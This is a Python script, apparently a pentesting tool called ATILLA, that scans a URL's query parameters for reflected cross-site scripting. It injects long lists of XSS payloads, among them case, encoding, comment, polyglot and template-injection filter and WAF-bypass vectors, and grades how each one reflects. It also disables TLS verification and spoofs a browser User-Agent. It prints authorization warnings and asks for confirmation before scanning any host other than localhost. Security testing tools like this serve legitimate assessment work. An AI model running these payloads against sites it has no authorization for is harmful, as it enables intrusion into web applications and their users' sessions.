#!/usr/bin/env python3
"""
Enhanced XSS Detection Tool - Educational Version
Purpose: For authorized security testing on YOUR OWN applications only
"""

import argparse
import asyncio
import random
import base64
import re
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Tuple
from datetime import datetime

try:
    import httpx
    from colorama import Fore, Style, init
    from pyfiglet import Figlet
except ImportError:
    print("Missing dependencies. Install with: pip install httpx colorama pyfiglet")
    exit(1)

import html
import urllib.parse

# Initialize colorama
init(autoreset=True)

# =======================
#       HEADER
# =======================

def print_header():
    try:
        f = Figlet(font='slant')
        print(Fore.CYAN + f.renderText("ATILLA"))
    except:
        print(Fore.CYAN + "=" * 60)
        print(Fore.CYAN + "   ATILLA")
        print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + "🔍 ATILLA - Use Only on Authorized Systems\n" + Style.RESET_ALL)
    print(Fore.RED + "⚠️  WARNING: Unauthorized testing is illegal!" + Style.RESET_ALL)
    

# =======================
#  COMPREHENSIVE PAYLOAD LIBRARY
# =======================

# Basic payloads from OWASP and common sources
BASIC_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<img src=x onload=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input type=text onfocus=alert(1) autofocus>",
    "javascript:alert(1)",
]

# OWASP and Exploit-DB inspired payloads
OWASP_PAYLOADS = [
    # Context breaking
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    
    # Attribute breaking
    "' onmouseover='alert(1)",
    "\" onmouseover=\"alert(1)",
    "' autofocus onfocus='alert(1)",
    "\" autofocus onfocus=\"alert(1)",
    
    # Event handlers
    "<body onpageshow=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    "<input onfocus=alert(1) autofocus>",
    
    # SVG vectors
    "<svg><script>alert(1)</script></svg>",
    "<svg/onload=alert(1)>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    
    # Data URI
    "<script src=data:text/javascript,alert(1)></script>",
    "<iframe src=data:text/html,<script>alert(1)</script>>",
    "<object data=data:text/html,<script>alert(1)</script>>",
    
    # Form-based
    "<form action=javascript:alert(1)><input type=submit>",
    "<button formaction=javascript:alert(1)>X</button>",
    
    # Filter bypass
    "<img src=x oNeRRor=alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<img src=x o\x00nerror=alert(1)>",
]

# Advanced WAF bypass payloads (from public sources)
WAF_BYPASS_PAYLOADS = [
    # Encoding variations
    "<script>\\u0061lert(1)</script>",
    "<script>&#97;&#108;&#101;&#114;&#116;(1)</script>",
    "<img src=x on&#101;rror=alert(1)>",
    
    # Case manipulation
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SvG/OnLoAd=alert(1)>",
    "<ImG sRc=x OnErRoR=alert(1)>",
    
    # Nested tags
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    
    # Comment injection
    "<script><!--*/alert(1)//--></script>",
    "<svg/on<!---->load=alert(1)>",
    "<img src=x onerror=ale<!---->rt(1)>",
    
    # String manipulation
    "<script>eval('al'+'ert(1)')</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    
    # Whitespace variations
    "<svg/onload\r=alert(1)>",
    "<svg/onload\n=alert(1)>",
    "<svg/onload\t=alert(1)>",
    "<svg/onload%0a=alert(1)>",
    "<svg/onload%0d=alert(1)>",
    
    # Protocol handlers
    "<a href=\"javascript:alert(1)\">X</a>",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    
    # Base64 encoding
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "<script src=\"data:text/javascript;base64,YWxlcnQoMSk=\"></script>",
    
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    
    # HTML entities
    "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
    "<svg onload=\"&#x61;&#x6c;&#x65;&#x72;&#x74;(1)\">",
    
    # Polyglot attempts
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//\\x3e",
    
    # Framework-specific
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    "{{$on.constructor('alert(1)')()}}",
    
    # Math/XML contexts
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<xml><script>alert(1)</script></xml>",
]

# =======================
#   DETECTION SIGNATURES
# =======================

XSS_SUCCESS_INDICATORS = [
    # Direct script execution indicators
    r'<script[^>]*>.*?alert.*?</script>',
    r'<script[^>]*>',
    r'javascript:',
    r'onerror\s*=',
    r'onload\s*=',
    r'onfocus\s*=',
    r'onmouseover\s*=',
    r'ontoggle\s*=',
    
    # SVG vectors
    r'<svg[^>]*>',
    r'<animate[^>]*>',
    
    # Event handlers
    r'on\w+\s*=\s*["\']?alert',
    
    # Data URIs
    r'data:text/html',
    r'data:text/javascript',
]

ENCODING_INDICATORS = [
    r'&lt;script',
    r'&gt;',
    r'&#\d+;',
    r'%3C',
    r'%3E',
    r'\\u00\w+',
]

# =======================
#   RESPONSE ANALYSIS
# =======================

def analyze_response(payload: str, response_text: str, response_headers: dict) -> Tuple[str, int, List[str]]:
    """
    Enhanced response analysis with detailed detection
    Returns: (category, confidence, details)
    """
    if not response_text:
        return "NO_RESPONSE", 0, []
    
    confidence = 0
    details = []
    
    # 1. Check for direct reflection (unencoded)
    if payload in response_text:
        confidence = 100
        details.append("Payload reflected without encoding")
        
        # Check if it's in executable context
        for pattern in XSS_SUCCESS_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                details.append(f"Executable context detected: {pattern}")
                return "VULNERABLE", confidence, details
        
        return "REFLECTED", confidence, details
    
    # 2. Check for encoded variants
    encoded_variants = {
        "HTML Entity": payload.replace("<", "&lt;").replace(">", "&gt;"),
        "URL Encoded": payload.replace("<", "%3C").replace(">", "%3E"),
        "HTML Escaped": html.escape(payload),
        "Quote Escaped": payload.replace("'", "&#39;").replace('"', "&quot;"),
        "Double URL": urllib.parse.quote(urllib.parse.quote(payload)),
    }
    
    for encoding_type, variant in encoded_variants.items():
        if variant in response_text:
            confidence = 60
            details.append(f"Payload encoded as: {encoding_type}")
            return "ENCODED", confidence, details
    
    # 3. Check for partial reflection
    payload_parts = [p for p in re.split(r'[<>\'"]', payload) if len(p) > 3]
    reflected_parts = [part for part in payload_parts if part in response_text]
    
    if reflected_parts:
        confidence = min(50, len(reflected_parts) * 15)
        details.append(f"Partial reflection: {len(reflected_parts)} parts found")
        details.extend([f"  - '{part[:30]}'" for part in reflected_parts[:3]])
        return "PARTIAL", confidence, details
    
    # 4. Check for filtering indicators
    filter_indicators = ["filtered", "blocked", "invalid", "sanitized", "escaped"]
    found_indicators = [ind for ind in filter_indicators if ind in response_text.lower()]
    
    if found_indicators:
        confidence = 20
        details.append(f"Filter indicators: {', '.join(found_indicators)}")
        return "FILTERED", confidence, details
    
    # 5. Check CSP headers
    csp = response_headers.get('content-security-policy', '')
    if csp and 'script-src' in csp.lower():
        details.append(f"CSP detected: {csp[:100]}")
        confidence = 10
        return "CSP_PROTECTED", confidence, details
    
    return "STRIPPED", 0, ["Payload completely stripped"]

def check_dom_xss_potential(response_text: str) -> List[str]:
    """
    Check for potential DOM-based XSS sinks
    """
    dom_sinks = [
        r'document\.write\(',
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'eval\(',
        r'setTimeout\(',
        r'setInterval\(',
        r'Function\(',
        r'\.location\s*=',
        r'\.src\s*=',
    ]
    
    findings = []
    for sink in dom_sinks:
        if re.search(sink, response_text, re.IGNORECASE):
            findings.append(f"Potential DOM sink: {sink}")
    
    return findings

# =======================
#   CORE SCANNER
# =======================

async def test_param(client, parsed_url, params, param, payloads, verbose=False, max_retries=3):
    base_params = params.copy()
    found_vulnerabilities = []
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}[*] Testing parameter: {Fore.YELLOW}{param}")
    print(f"{Fore.CYAN}{'='*60}")

    for idx, payload in enumerate(payloads, 1):
        test_params = base_params.copy()
        test_params[param] = payload
        
        url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
        
        if verbose:
            print(f"\n{Fore.CYAN}[{idx}/{len(payloads)}] Testing payload:")
            print(f"{Fore.YELLOW}  {payload[:80]}")
        
        retry_count = 0
        response = None
        
        # Retry logic
        while retry_count < max_retries:
            try:
                response = await client.get(url, follow_redirects=True)
                break
            except httpx.TimeoutException:
                retry_count += 1
                if verbose:
                    print(f"{Fore.YELLOW}  [TIMEOUT] Retry {retry_count}/{max_retries}")
                await asyncio.sleep(1)
            except httpx.RequestError as e:
                retry_count += 1
                if verbose:
                    print(f"{Fore.YELLOW}  [ERROR] {str(e)[:50]} - Retry {retry_count}/{max_retries}")
                await asyncio.sleep(1)
            except Exception as e:
                if verbose:
                    print(f"{Fore.MAGENTA}  [UNEXPECTED ERROR] {str(e)[:50]}")
                break
        
        if response is None:
            print(f"{Fore.RED}  [✗] Failed to get response")
            continue
        
        # Analyze response
        try:
            category, confidence, details = analyze_response(
                payload, response.text, dict(response.headers)
            )
            
            # Check for DOM XSS potential
            dom_findings = check_dom_xss_potential(response.text)
            
            # Determine if vulnerable
            if category in ["VULNERABLE", "REFLECTED"] and confidence >= 80:
                vuln_info = {
                    'param': param,
                    'payload': payload,
                    'url': url,
                    'confidence': confidence,
                    'category': category,
                    'details': details,
                    'dom_sinks': dom_findings,
                    'response_length': len(response.text),
                    'status_code': response.status_code
                }
                found_vulnerabilities.append(vuln_info)
                
                print(f"{Fore.RED}  [✓] POTENTIAL XSS DETECTED!")
                print(f"{Fore.RED}  Confidence: {confidence}%")
                print(f"{Fore.RED}  Category: {category}")
                print(f"{Fore.YELLOW}  Payload: {payload[:100]}")
                for detail in details:
                    print(f"{Fore.YELLOW}  - {detail}")
                if dom_findings:
                    print(f"{Fore.MAGENTA}  DOM Sinks Found:")
                    for sink in dom_findings[:3]:
                        print(f"{Fore.MAGENTA}    - {sink}")
                
            elif category == "REFLECTED" and confidence >= 60:
                print(f"{Fore.YELLOW}  [~] Reflected but may be filtered")
                print(f"{Fore.YELLOW}  Confidence: {confidence}%")
                if verbose:
                    for detail in details:
                        print(f"{Fore.YELLOW}    - {detail}")
                        
            elif category == "ENCODED" and confidence >= 40:
                print(f"{Fore.MAGENTA}  [~] Payload encoded in response")
                if verbose:
                    for detail in details:
                        print(f"{Fore.MAGENTA}    - {detail}")
                        
            elif category == "PARTIAL" and confidence >= 30:
                print(f"{Fore.CYAN}  [~] Partial reflection detected")
                if verbose:
                    for detail in details:
                        print(f"{Fore.CYAN}    - {detail}")
                        
            elif verbose:
                print(f"{Fore.GREEN}  [✗] {category} - Confidence: {confidence}%")
                
        except Exception as e:
            if verbose:
                print(f"{Fore.MAGENTA}  [ANALYSIS ERROR] {str(e)[:50]}")
        
        # Rate limiting
        await asyncio.sleep(random.uniform(0.2, 0.5))
    
    return found_vulnerabilities

async def scan_xss(url: str, verbose=False, payload_set="all", timeout=15, output_file=None):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        print(Fore.RED + "[-] No query parameters found in URL. Example: ?q=test" + Style.RESET_ALL)
        return

    # Select payload set
    if payload_set == "basic":
        payloads = BASIC_PAYLOADS
        print(f"{Fore.CYAN}[*] Using BASIC payload set ({len(payloads)} payloads)")
    elif payload_set == "owasp":
        payloads = BASIC_PAYLOADS + OWASP_PAYLOADS
        print(f"{Fore.CYAN}[*] Using OWASP payload set ({len(payloads)} payloads)")
    elif payload_set == "advanced":
        payloads = WAF_BYPASS_PAYLOADS
        print(f"{Fore.CYAN}[*] Using ADVANCED payload set ({len(payloads)} payloads)")
    else:  # all
        payloads = BASIC_PAYLOADS + OWASP_PAYLOADS + WAF_BYPASS_PAYLOADS
        print(f"{Fore.CYAN}[*] Using ALL payloads ({len(payloads)} payloads)")

    print(f"{Fore.CYAN}[*] Target: {url}")
    print(f"{Fore.CYAN}[*] Parameters: {', '.join(params.keys())}")
    print(f"{Fore.CYAN}[*] Scan started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

    limits = httpx.Limits(max_keepalive_connections=5, max_connections=10)
    
    try:
        async with httpx.AsyncClient(
            timeout=httpx.Timeout(timeout, connect=5.0),
            headers=headers,
            verify=False,
            limits=limits,
            follow_redirects=True
        ) as client:
            all_vulnerabilities = []
            for param in params:
                vulns = await test_param(
                    client, parsed, params, param, payloads, verbose
                )
                all_vulnerabilities.extend(vulns)
            
            # Final summary
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.CYAN}SCAN COMPLETE")
            print(f"{Fore.CYAN}{'='*60}")
            print(f"{Fore.YELLOW}Scan finished: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"{Fore.YELLOW}Total potential vulnerabilities: {len(all_vulnerabilities)}")
            
            if all_vulnerabilities:
                print(f"\n{Fore.RED}[!] VULNERABLE PARAMETERS DETECTED:")
                for vuln in all_vulnerabilities:
                    print(f"\n{Fore.RED}  Parameter: {vuln['param']}")
                    print(f"{Fore.RED}  Confidence: {vuln['confidence']}%")
                    print(f"{Fore.RED}  Category: {vuln['category']}")
                    print(f"{Fore.YELLOW}  Payload: {vuln['payload'][:80]}")
                    print(f"{Fore.CYAN}  URL: {vuln['url'][:100]}...")
                    if vuln['details']:
                        print(f"{Fore.YELLOW}  Details:")
                        for detail in vuln['details']:
                            print(f"{Fore.YELLOW}    - {detail}")
                
                # Save to file if requested
                if output_file:
                    save_results(url, all_vulnerabilities, output_file)
                    
            else:
                print(f"{Fore.GREEN}\n[✓] No high-confidence vulnerabilities detected")
                print(f"{Fore.GREEN}[✓] Application appears to be filtering input properly")
                
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error during scan: {str(e)}")

def save_results(url: str, vulnerabilities: List[Dict], filename: str):
    """Save scan results to JSON file"""
    results = {
        'scan_time': datetime.now().isoformat(),
        'target_url': url,
        'vulnerabilities_found': len(vulnerabilities),
        'details': vulnerabilities
    }
    
    try:
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n{Fore.GREEN}[✓] Results saved to: {filename}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Failed to save results: {str(e)}")

# =======================
#           CLI
# =======================

def main():
    print_header()

    parser = argparse.ArgumentParser(
        description="ATILLA - For AUTHORIZED testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python xss_scanner.py -u "http://localhost/search?q=test" --set basic
  python xss_scanner.py -u "http://localhost/page?id=1" --set owasp -v
  python xss_scanner.py -u "http://localhost/search?q=test" --set all -o results.json
  
Payload Sets:
  basic    - Basic XSS payloads (fastest)
  owasp    - OWASP + basic payloads (recommended)
  advanced - Advanced WAF bypass payloads
  all      - All available payloads (slowest, most comprehensive)
        """
    )
    parser.add_argument("-u", "--url", required=True,
                        help="Target URL with query parameters (YOUR OWN application only)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Show detailed output for each payload")
    parser.add_argument("--set", choices=["basic", "owasp", "advanced", "all"],
                        default="owasp", help="Payload set to use (default: owasp)")
    parser.add_argument("--timeout", type=int, default=15,
                        help="Request timeout in seconds (default: 15)")
    parser.add_argument("-o", "--output", help="Save results to JSON file")

    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] Error: URL must start with http:// or https://")
        return
    
    parsed = urlparse(args.url)
    if not parsed.query:
        print(f"{Fore.RED}[!] Error: URL must contain query parameters (e.g., ?q=test)")
        return
    
    # Confirmation for non-localhost URLs
    if 'localhost' not in parsed.netloc and '127.0.0.1' not in parsed.netloc:
        print(f"{Fore.RED}WARNING: You are about to scan a non-localhost URL!")
        print(f"{Fore.RED}Only proceed if you have written authorization to test: {parsed.netloc}")
        confirm = input(f"{Fore.YELLOW}Type 'YES' to continue: ")
        if confirm != 'YES':
            print(f"{Fore.GREEN}Scan cancelled.")
            return

    try:
        asyncio.run(scan_xss(
            args.url,
            verbose=args.verbose,
            payload_set=args.set,
            timeout=args.timeout,
            output_file=args.output
        ))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Unexpected error: {str(e)}")


if __name__ == "__main__":
    main()